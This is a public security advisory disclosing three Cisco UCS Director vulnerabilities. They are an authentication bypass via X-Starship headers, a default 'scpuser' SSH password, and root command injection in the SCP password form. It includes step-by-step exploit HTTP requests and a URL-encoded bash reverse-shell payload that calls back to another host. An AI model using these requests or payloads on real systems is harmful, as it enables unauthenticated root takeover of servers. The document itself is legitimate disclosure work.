@@ -1,0 +1,342 @@
+>> Multiple critical vulnerabilities in Cisco UCS Director, Cisco Integrated Management Controller Supervisor and Cisco UCS Director Express for Big Data
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com) from Agile Information Security
+=================================================================================
+Disclosure: 21/08/2019 / Last updated: 22/08/2019
+
+
+>> Executive summary:
+Cisco UCS Director (UCS) is a cloud orchestration product that automates common private cloud infrastructure management functions. It is built using Java and a variety of other technologies and distributed as a Linux based virtual appliance. A demo of the UCS virtual appliance can be freely downloaded from Cisco's website [1].
+
+Due to several coding errors, it is possible for an unauthenticated remote attacker with no privileges to bypass authentication and abuse a password change function to inject arbitrary commands and execute code as root.
+In addition, there is a default unprivileged user with a known password that can login via SSH and execute commands on the virtual appliance provided by Cisco. 
+Two Metasploit modules were released with this advisory, one that exploits the authentication bypass and command injection, and another that exploits the default SSH password.
+
+Please note that according to Cisco [2] [3] [4], all three vulnerabilities described in this advisory affect Cisco UCS Director, Cisco Integrated Management Controller Supervisor and Cisco UCS Director Express for Big Data. However, Agile Information Security only tested Cisco UCS Director.
+
+Agile Information Security would like to thank Accenture Security (previously iDefense) [5] for handling the disclosure process with Cisco.
+
+
+>> Vendor description [6]:
+"Cisco UCS Director delivers a foundation for private cloud Infrastructure as a Service (IaaS). It is a heterogeneous management platform that features multivendor task libraries with more than 2500 out-of-the-box workflow tasks for end-to-end converged and hyperconverged stack automation.
+You can extend your capabilities to:
+- Automate provisioning, orchestration, and management of Cisco and third-party infrastructure resources
+- Order resources and services from an intuitive self-service portal
+- Automate security and isolation models to provide repeatable services
+- Standardize and automate multitenant environments across shared infrastructure instances"
+
+
+>> Technical details:
+#1
+Vulnerability: Web Interface Authentication Bypass / CWE-287
+CVE-2019-1937
+Cisco Bug ID: CSCvp19229 [2]
+Risk Classification: Critical
+Attack Vector: Remote
+Constraints: No authentication required
+Affected versions: confirmed in Cisco UCS Director versions 6.6.0 and 6.7.0, see [2] for Cisco's list of affected versions
+
+UCS exposes a management web interface on ports 80 and 443 so that users of UCS can perform cloud management functions.
+Due to a number of coding errors and bad practices, it is possible for an unauthenticated attacker to obtain an administrative session by bypassing authentication. 
+The following sequence of requests and responses shows the authentication bypass works.
+
+1.1) First we send a request to ClientServlet to check our authentication status:
+GET /app/ui/ClientServlet?apiName=GetUserInfo HTTP/1.1
+Host: 10.0.3.100
+Referer: https://10.0.3.100/
+X-Requested-With: XMLHttpRequest
+
+... to which the server responds with a redirect to the login page since we are not authenticated:
+HTTP/1.1 302 Found
+Location: https://10.0.3.100/app/ui/login.jsp
+Content-Length: 0
+Server: Web
+
+1.2) We now follow the redirection to obtain a JSESSIONID cookie:
+GET /app/ui/login.jsp HTTP/1.1
+Host: 10.0.3.100
+Referer: https://10.0.3.100/
+X-Requested-With: XMLHttpRequest
+
+And the server responds with our cookie:
+HTTP/1.1 200 OK
+Set-Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC745; Path=/app; Secure; HttpOnly
+Server: Web
+
+1.3) Then we repeat the request from 1.1), but this time with the JSESSIONID cookie obtained in 1.2):
+GET /app/ui/ClientServlet?apiName=GetUserInfo HTTP/1.1
+Host: 10.0.3.100
+Referer: https://10.0.3.100/
+Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
+X-Requested-With: XMLHttpRequest
+
+... and we still get redirected to the login page, as in step 1.1):
+HTTP/1.1 302 Found
+Location: https://10.0.3.100/app/ui/login.jsp
+Content-Length: 0
+Server: Web
+
+1.4) To completely bypass authentication, we just need to send the JSESSIONID cookie with added X-Starship-UserSession-Key and X-Starship-Request-Key HTTP headers set to random values:
+GET /app/ui/ClientServlet?apiName=GetUserInfo HTTP/1.1
+Host: 10.0.3.100
+Referer: https://10.0.3.100/
+X-Starship-UserSession-Key: ble
+X-Starship-Request-Key: bla
+Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
+X-Requested-With: XMLHttpRequest
+
+HTTP/1.1 200 OK
+Set-Cookie: JSESSIONID=971D41B487F637DA84FCAF9E97A479429D4031F465DA445168A493254AA104E3; Path=/app; Secure; HttpOnly
+Connection: close
+Server: Web
+Content-Length: 428
+
+{"productaccess_id":0,"loginName":"admin","productId":"cloupia_service_portal","accessLevel":null,"isEulaAccepted":false,"eulaAcceptTime":null,"eulaSrcHost":null,"restKey":"bla","allowedOperations":null,"userType":null,"server":null,"domainName":null,"suspend":false,"starshipUserId":null,"starshipUserLocale":null,"isAdminPasswordReset":true,"profileId":0,"credentialId":"","isClassicUIEnabled":false,"starshipSessionId":"ble"}
+
+... and just like that, we can see from the information the server returned that we are logged in as the "admin" user! From now on, we need to use the new JSESSIONID cookie returned by the server in 1.4) to have full administrative access to the UCS web interface.
+
+To summarise, our exploit needs to:
+a) obtain a JSESSIONID cookie
+b) "authenticate" it by sending a request to ClientServlet with the X-Starship-UserSession-Key and X-Starship-Request-Key HTTP headers set to random values
+c) use the new JSESSIONID cookie returned in b) as the "admin" authenticated cookie
+
+In some cases, the server will authenticate the old cookie and not return a new one, but the effect is the same - the "old" JSESSIONID cookie will be authenticated as an "admin" cookie.
+
+Let's dig into the decompiled code, and see what is happening under the hood.
+
+All the coding errors that make this possible are in the class com.cloupia.client.web.auth.AuthenticationFilter, which as a javax.servlet.Filter subclass whose doFilter() function is invoked on every request that the server receives (as configured by the web application).
+
+A snippet of com.cloupia.client.web.auth.AuthenticationFilter.doFilter() is shown below, with comments preceded with ^^^:
+
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
+      (...)
+            httpRequest = (HttpServletRequest)request;
+            logger.debug("doFilter url: " + httpRequest.getRequestURL().toString());
+            boolean isAuthenticated = this.authenticateUser(httpRequest);
+              ^^^ 1.5) invokes authenticateUser() (function shown below)
+              
+            String samlLogoutRequest;
+            if(!isAuthenticated) {
+              ^^^ 1.6) if authenticateUser() returns false, we go into this branch
+              
+                samlLogoutRequest = request.getParameter("SAMLResponse");
+                logger.info("samlResponse-->" + samlLogoutRequest);
+                if(samlLogoutRequest != null) {
+                    this.handleSAMLReponse(request, response, chain, samlLogoutRequest);
+                } else {
+                  ^^^ 1.7) if there is no SAMLResponse HTTP parameter, we go into this branch
+                  
+                    HttpSession session;
+                    ProductAccess userBean;
+                    String requestedUri;
+                    if(this.isStarshipRequest(httpRequest)) {
+                      ^^^ 1.8) checks if isStarshipRequest() returns true (function shown below)
+                      
+                        session = null != httpRequest.getSession(false)?httpRequest.getSession(false):httpRequest.getSession(true);
+                        userBean = (ProductAccess)session.getAttribute("USER_IN_SESSION");
+                        if(userBean == null) {
+                          ^^^ 1.9) if there is no session server side for this request, follow into this branch...
+                          
+                            try {
+                                userBean = new ProductAccess();
+                                userBean.setCredentialId("");
+                                userBean.setAdminPasswordReset(true);
+                                userBean.setProductId("cloupia_service_portal");
+                                userBean.setProfileId(0);
+                                userBean.setRestKey(httpRequest.getHeader("X-Starship-Request-Key"));
+                                userBean.setStarshipUserId(httpRequest.getHeader("X-Starship-UserName-Key"));
+                                userBean.setLoginName("admin");
+                                  ^^^ 1.10) and create a new session with the user as "admin"!
+                                  
+                                userBean.setStarshipSessionId(httpRequest.getHeader("X-Starship-UserSession-Key"));
+                                requestedUri = httpRequest.getHeader("X-Starship-UserRoles-Key");
+                                userBean.setAccessLevel(requestedUri);
+                                if(requestedUri != null && requestedUri.equalsIgnoreCase("admin")) {
+                                    AuthenticationManager authmgr = AuthenticationManager.getInstance();
+                                    userBean.setAccessLevel("Admin");
+                                    authmgr.evaluateAllowedOperations(userBean);
+                                }
+
+                                session.setAttribute("USER_IN_SESSION", userBean);
+                                session.setAttribute("DEFAULT_URL", STARSHIP_DEFAULT_URL);
+                                logger.info("userBean:" + userBean.getAccessLevel());
+                            } catch (Exception var12) {
+                                logger.info("username/password wrong for rest api access - " + var12.getMessage());
+                            }
+
+                            logger.info("userBean: " + userBean.getAccessLevel());
+                        }
+
+                        chain.doFilter(request, response);
+      (...)
+    }
+    
+As it can be read in the inline comments in the function above, our first hurdle at 1.5) is to make authenticateUser() return false:
+
+    private boolean authenticateUser(HttpServletRequest request) {
+        boolean isValidUser = false;
+        HttpSession session = null;
+        session = request.getSession(false);
+          ^^^ 1.11) get the session for this request
+          
+        if(session != null) {
+            ProductAccess user = (ProductAccess)session.getAttribute("USER_IN_SESSION");
+            if(user != null) {
+                isValidUser = true;
+                if(this.isStarshipRequest(request) && !user.isStarshipAccess(request.getHeader("X-Starship-UserSession-Key"))) {
+                    isValidUser = false;
+                } else {
+                    logger.debug("AuthenticationFilter:authenticateUser - User " + user.getLoginName() + " has been previously authenticated");
+                }
+            }
+        } else {
+            logger.info("AuthenticationFilter:authenticateUser - session is null");
+              ^^^ 1.12) no session found, return isValidUser which is false as set at the start of the function
+              
+        }
+
+        return isValidUser;
+    }
+    
+This is easily done, and it works as expected - we do not have a session, so at 1.11) the session is null, and then we go into 1.12) which makes the function return false.
+
+We now go back to the doFilter() function, and go into the branch in 1.6). As we have not sent a SAMLResponse HTTP parameter, we follow into the 1.7) branch.
+Now we get to the critical part in 1.8). Here, isStarshipRequest() is invoked, and if it returns true, the server will create an "admin" session for us...
+
+    private boolean isStarshipRequest(HttpServletRequest httpRequest) {
+        return null != httpRequest.getHeader("X-Starship-UserSession-Key") && null != httpRequest.getHeader("X-Starship-Request-Key");
+    }
+
+isStarshipRequest() is shown above, and clearly the only thing we need to do to make it return true is to set the X-Starship-UserSession-Key and X-Starship-Request-Key HTTP headers.
+
+We then follow into 1.9) and 1.10), and we get our administrative session without having any credentials at all!
+Moreover, the session is completely stealthy and invisible to other users, as it does not appear in Administration -> Users and Groups -> All Users Login History nor in Administration -> Users and Groups -> Current Online Users.
+
+
+#2
+Vulnerability: Default password for 'scpuser' / CWE-798
+CVE-2019-1935
+Cisco Bug ID: CSCvp19251 [3]
+Risk Classification: Critical
+Attack Vector: Remote
+Constraints: requires auth, does not, etc
+Affected versions: confirmed in Cisco UCS Director versions 6.6.0 and 6.7.0, see [3] for Cisco's list of affected versions
+
+The UCS virtual appliance is configured with a user 'scpuser' that is supposed to be used for scp file transfer between UCS appliances and other Cisco modules.
+
+According to Cisco's documentation [7]:
+"An SCP user is used by server diagnostics and tech support upload operations for transferring files to the Cisco IMC Supervisor appliance using the SCP protocol. An scp user account cannot be used to login to the Cisco IMC Supervisor UI or the shelladmin."
+
+The web interface contains functionality to change the user password for the 'scpuser' in Administration -> Users and Groups -> SCP User Configuration, and in this page it says:
+"The 'scpuser' will be configured on this appliance in order to enable file transfer operations via the 'scp' command. This user account cannot be used to login to the GUI or shelladmin"
+
+Apparently this is not true and not only the user can log in via SSH per default, but it does so with a default password of 'scpuser' if it not changed by the administrator after installation:
+UCS > ssh scpuser@10.0.3.100
+Password: <scpuser>
+[scpuser@localhost ~]$ whoami
+scpuser
+
+
+#3
+Vulnerability: Authenticated command injection via the web interface as root (CWE-78)
+CVE-2019-1936
+Cisco Bug ID: CSCvp19245 [4]
+Risk Classification: Critical
+Attack Vector: Remote
+Constraints: requires authentication to the UCS web interface
+Affected versions: confirmed in Cisco UCS Director versions 6.6 and 6.7, see [4] for Cisco's list of affected versions
+
+As shown in #2, the web interface contains functionality to change the user password for the 'scpuser' in Administration -> Users and Groups -> SCP User Configuration.
+
+This is handled by the Java class com.cloupia.feature.cimc.forms.SCPUserConfigurationForm in doFormSubmit(), which is shown below, with my markers and comments preceded with ^^^:
+
+    public FormResult doFormSubmit(String user, ReportContext context, String formId, FormFieldData[] data) throws Exception {
+        logger.info((Object)"doFormSubmit invoked ");
+        FormResult result = this.validateForm(context, this.getDefinition(), formId, data, true);
+        if (result.getStatus() == 0) {
+            try {
+                SCPUserConfig existingConfig;
+                FormFieldDataList datalist = new FormFieldDataList(data);
+                String password = datalist.getById(FIELD_ID_PASSWORD).getValue();
+                        ^^^ 3.1) gets "password" from the form sent by the user
+                SCPUserConfig newSCPUserConfig = new SCPUserConfig();
+                newSCPUserConfig.setPassword(password);
+                if ("**********".equals(password) && (existingConfig = CIMCPersistenceUtil.getSCPUserConfig()) != null) {
+                    newSCPUserConfig.setPassword(existingConfig.getPassword());
+                }
+                CIMCPersistenceUtil.setSCPUserConfig(newSCPUserConfig);
+                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "echo -e \"" + password + "\\n" + password + "\" | (passwd --stdin " + "scpuser" + ")"});
+                        ^^^ 3.2) runs /bin/sh with "password" argument
+                p.waitFor();
+                datalist.getById(FIELD_ID_PASSWORD).setValue("**********");
+                result.setStatus(2);
+                result.setStatusMessage(RBUtil.getString((String)"CIMCControllerFeature.form.scpuser.success.label"));
+                return result;
+            }
+            catch (Exception ex) {
+                result.setStatusMessage(ex.getMessage());
+                result.setStatus(1);
+                return result;
+            }
+        }
+        return result;
+    }
+}
+
+In 3.1) we see that the function gets the "password" field from the from sent by the user, and in 3.2) it passes this input directly to Runtime.getRuntime().exec(), which leads to a clear command injection. This is run as root, as the web server runs as root and superuser access would be necessary anyway to change a password of another user.
+
+To obtain a reverse shell, we can send the following payload to ClientServlet, which will then invoke the SCPUserConfigurationForm.doFormSubmit():
+POST /app/ui/ClientServlet HTTP/1.1
+Host: 10.0.3.100
+Referer: https://10.0.3.100/app/ux/index.html
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 945
+Cookie: JSESSIONID=C72361B8C66F8FDF871F94C1FC1E07974E9B5B9E1C953D713E4DC305CB2D4CD1
+
+formatType=json&apiName=ExecuteGenericOp&serviceName=InfraMgr&opName=doFormSubmit&opData=%7B%22param0%22%3A%22admin%22%2C%22param1%22%3A%7B%22ids%22%3Anull%2C%22targetCuicId%22%3Anull%2C%22uiMenuTag%22%3A23%2C%22cloudName%22%3Anull%2C%22filterId%22%3Anull%2C%22id%22%3Anull%2C%22type%22%3A10%7D%2C%22param2%22%3A%22scpUserConfig%22%2C%22param3%22%3A%5B%7B%22fieldId%22%3A%22FIELD_ID_USERNAME%22%2C%22value%22%3A%22scpuser%22%7D%2C%7B%22fieldId%22%3A%22FIELD_ID_DESCRIPTION%22%2C%22value%22%3A%22The%20'scpuser'%20will%20be%20configured%20on%20this%20appliance%20in%20order%20to%20enable%20file%20transfer%20operations%20via%20the%20'scp'%20command.%20This%20user%20account%20cannot%20be%20used%20to%20login%20to%20the%20GUI%20or%20shelladmin.%22%7D%2C%7B%22fieldId%22%3A%22FIELD_ID_PASSWORD%22%2C%22value%22%3A%22%60%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%33%2e%39%2f%34%34%34%34%20%30%3e%26%31%60%22%7D%5D%7D
+
+In the example above, the FIELD_ID_PASSWORD is set to "`bash -i >& /dev/tcp/10.0.3.9/4444 0>&1`", which returns a reverse shell to host 10.0.3.9 on port 4444 running as root:
+
+UCS > nc -lvkp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.0.3.100 55432 received!
+bash: no job control in this shell
+[root@localhost inframgr]# whoami
+root
+
+
+>> Exploitation summary:
+By chaining vulnerability #1 (authentication bypass) with vulnerability #3 (authenticated command injection as root), it is clear that an unauthenticated attacker with no privileges on the system can execute code as root, leading to total compromise of Cisco UCS Director.
+
+
+>> Vulnerability Fixes / Mitigation:
+According to Cisco [2] [3] [4] the three vulnerabilities described in this advisory were fixed in the product versions described below:
+Cisco IMC Supervisor releases 2.2.1.0 and later
+Cisco UCS Director releases 6.7.2.0 and later (recommended: 6.7.3.0)
+Cisco UCS Director Express for Big Data releases 3.7.2.0 and later (recommended: 3.7.3.0)
+
+
+>> References:
+[1] https://www.cisco.com/c/en/us/support/servers-unified-computing/ucs-director-evaluation/model.html
+[2] https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby
+[3] https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-usercred
+[4] https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-cmdinj
+[5] https://www.accenture.com/us-en/service-idefense-security-intelligence
+[6] https://www.cisco.com/c/en/us/products/servers-unified-computing/ucs-director/index.html
+[7] https://www.cisco.com/c/en/us/td/docs/unified_computing/ucs/ucs-director/rack-server-guide/6-7/cisco-ucs-director-rack-server-mgmt-guide-67/cisco-ucs-director-rack-server-mgmt-guide-67_chapter_01011.html#task_1599289A49FB49D48486A66A8358A2AD
+
+
+>> Disclaimer:
+Please note that Agile Information Security (Agile InfoSec) relies on information provided by the vendor when listing fixed versions or products. Agile InfoSec does not verify this information, except when specifically mentioned in this advisory or when requested or contracted by the vendor to do so. 
+Unconfirmed vendor fixes might be ineffective or incomplete, and it is the vendor's responsibility to ensure the vulnerabilities found by Agile Information Security are resolved properly.
+Agile Information Security Limited does not accept any responsibility, financial or otherwise, from any material losses, loss of life or reputational loss as a result of misuse of the information or code contained or mentioned in this advisory.
+It is the vendor's responsibility to ensure their products' security before, during and after release to market.
+
+All information, code and binary data in this advisory is released to the public under the GNU General Public License, version 3 (GPLv3).
+For information, code or binary data obtained from other sources that has a license which is incompatible with GPLv3, the original license prevails. 
+For more information check https://www.gnu.org/licenses/gpl-3.0.en.html
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business.
